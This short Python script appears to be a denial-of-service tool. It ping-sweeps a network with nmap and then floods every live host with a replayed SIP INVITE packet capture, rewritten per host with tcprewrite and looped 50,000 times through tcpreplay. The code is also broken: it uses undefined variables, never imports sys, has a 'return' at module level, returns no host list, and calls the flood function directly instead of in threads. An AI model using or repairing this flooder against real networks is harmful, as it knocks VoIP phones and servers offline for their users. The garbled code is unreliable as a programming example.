import subprocess
import random
import time
import threading
from multiprocessing import Pool
import nmap 

def scanNetwork(network):
    hosts = []
    nm = nmap.PortScanner()
    out = nm.scan(hosts=network, arguments='-sP')
    for k, v in a['scan'].iteritems():
        if str(v['status']['state']) == 'up':
            try:
                returnlist.append([str(v['addresses']['ipv4']), str(v['addresses']['mac'])])
            except:
                pass
    print hosts 

def flood_DoS(id, IP, MAC):
 subprocess.call(['tcprewrite', '--dstipmap=192.168.1.18:'+IP,
 '--enet-dmac='+MAC,'--dlt=enet','--fixcsum', '--infile=sipInvite.pcap',
 '--outfile=newSipInvite'+id+'.pcap'])
 
 subprocess.Popen(['tcpreplay', '--intf1=eth0', '--loop=50000',
 'newSipInvite'+id+'.pcap'])
return 

if __name__ == "__main__":
	 hosts = scanNetwork(sys.argv[1])
	 jobs = []
	 for i in range(0, len(hosts)):
	 IP=hosts[i][0]
	 MAC=hosts[i][1]
	 thr = threading.Thread(target=flood_DoS(i,IP,MAC))
	 jobs.append(thr)
 for j in jobs:
  	j.start()
 for j in jobs:
 	j.join()
